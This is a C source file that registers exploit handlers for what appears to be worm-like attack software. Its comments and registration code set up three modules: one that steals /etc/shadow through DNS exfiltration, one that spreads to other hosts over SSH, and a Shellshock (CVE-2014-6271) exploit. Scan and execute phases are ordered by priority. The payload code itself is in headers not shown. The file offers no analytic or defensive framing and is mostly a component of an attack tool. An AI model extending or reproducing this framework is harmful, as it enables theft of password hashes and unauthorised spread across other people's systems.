#include "handler_registry.h"
#include "cve_2014_6271.h"  // Include CVE handler files
#include "cve_ssh_propagation.h"  // Include SSH propagation handler
#include "cve_shadow_exfiltration.h"  // Include shadow exfiltration handler
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static cve_handler_config_t handlers[MAX_CVE_HANDLERS];
static int num_handlers = 0;

/**
 * Initialize Handler Registry
 * Registers all CVE handlers with their scan and execution function pointers.
 * 
 * Handler Registration:
 *   Each handler provides:
 *   - cve_id: Unique identifier for the CVE
 *   - scan_func: Function pointer to scan handler (Phase 1)
 *   - exec_func: Function pointer to execution handler (Phase 3)
 *   - priority_order: Priority for decision engine (lower = higher priority)
 * 
 * Registered Handlers:
 *   1. Shadow Exfiltration (priority -1): Steals /etc/shadow via DNS exfiltration
 *   2. SSH Propagation (priority 0): Propagates to other hosts via SSH
 *   3. Shellshock CVE-2014-6271 (priority 1): Exploits Shellshock vulnerability
 * 
 * @note Handlers must be registered before scan/execution phases can run.
 * @note Priority order determines execution order when multiple CVEs are eligible.
 */
void init_handler_registry(void) {
    num_handlers = 0;
    
    // Register Shadow Exfiltration handler
    handlers[0].cve_id = CVE_SHADOW_EXFILTRATION;
    handlers[0].scan_func = cve_shadow_exfiltration_scan;
    handlers[0].exec_func = cve_shadow_exfiltration_execute;
    handlers[0].priority_order = -1;
    num_handlers = 1;
    
    // Register SSH Propagation handler
    handlers[1].cve_id = CVE_SSH_PROPAGATION;
    handlers[1].scan_func = cve_ssh_propagation_scan;
    handlers[1].exec_func = cve_ssh_propagation_execute;
    handlers[1].priority_order = 0;
    num_handlers = 2;
    
    // Register Shellshock handler
    handlers[2].cve_id = CVE_2014_6271;
    handlers[2].scan_func = cve_2014_6271_scan;
    handlers[2].exec_func = cve_2014_6271_execute;
    handlers[2].priority_order = 1;
    num_handlers = 3;
}

/**
 * Get Handler by CVE ID
 * Retrieves handler configuration for a specific CVE.
 * 
 * @param cve_id CVE identifier to look up.
 * @return Pointer to handler configuration, or NULL if CVE not found.
 * 
 * @note Returned pointer is to internal registry storage - do not free.
 */
cve_handler_config_t* get_handler(int cve_id) {
    for (int i = 0; i < num_handlers; i++) {
        if (handlers[i].cve_id == cve_id) {
            return &handlers[i];
        }
    }
    return NULL;
}

/**
 * Call Scan Handler (Phase 1)
 * Invokes a CVE's scan handler function to check for vulnerabilities.
 * 
 * @param handler Handler configuration containing scan function pointer.
 * @param target_ip Optional target IP address. Handler may ignore this if it performs
 *                  its own scanning (e.g., network discovery).
 * @return Scan result structure containing vulnerability status, confidence, port info.
 * 
 * @note Scan handlers perform local or remote checks to determine if CVE is exploitable.
 * @note Results are used by decision engine to select which CVE to execute.
 */
cve_scan_result_t call_scan_handler(cve_handler_config_t* handler, const char* target_ip) {
    cve_scan_result_t result = {0};
    
    if (!handler || !handler->scan_func) {
        return result;
    }
    
    result = handler->scan_func(target_ip);
    result.cve_id = handler->cve_id;
    
    return result;
}

/**
 * Call Execution Handler (Phase 3)
 * Invokes a CVE's execution handler function to perform the exploit/operation.
 * 
 * @param handler Handler configuration containing execution function pointer.
 * @param target_ip Optional target IP address. Handler may ignore this if it uses
 *                  its own target list (e.g., from scan phase).
 * @return 1 if execution succeeded, 0 on failure.
 * 
 * @note Execution handlers perform actual operations: exploits, propagation, exfiltration, etc.
 * @note Success/failure is tracked for risk assessment behavioral signals.
 */
int call_execution_handler(cve_handler_config_t* handler, const char* target_ip) {
    if (!handler || !handler->exec_func) {
        return 0;
    }
    
    return handler->exec_func(target_ip);
}

/**
 * Scan All Registered Handlers
 * Executes all registered scan handlers and collects their results.
 * 
 * @param target_ip Optional target IP address passed to all scan handlers.
 *                  Handlers may ignore this parameter if they perform their own scanning.
 * @return Vector of scan results, one entry per registered handler.
 * 
 * @note This is the main entry point for Phase 1 (Scan Phase).
 * @note Results vector is populated with results from all handlers, regardless of
 *       whether vulnerabilities were found.
 */
cve_result_vector_t scan_all_handlers(const char* target_ip) {
    cve_result_vector_t vector = {0};
    
    for (int i = 0; i < num_handlers; i++) {
        if (vector.count < MAX_CVE_HANDLERS) {
            vector.results[vector.count] = call_scan_handler(&handlers[i], target_ip);
            vector.count++;
        }
    }
    
    return vector;
}

